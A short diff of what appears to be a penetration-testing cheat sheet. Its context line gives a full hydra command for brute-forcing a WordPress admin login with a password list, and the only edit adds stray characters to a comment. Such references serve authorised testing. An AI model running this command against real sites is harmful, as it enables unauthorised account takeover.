@@ -1,4 +1,4 @@
-				brute force a Wordpress admin login
+eeeee				brute force a Wordpress admin login
 hydra -l admin -P passwords.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
  
 				FTP
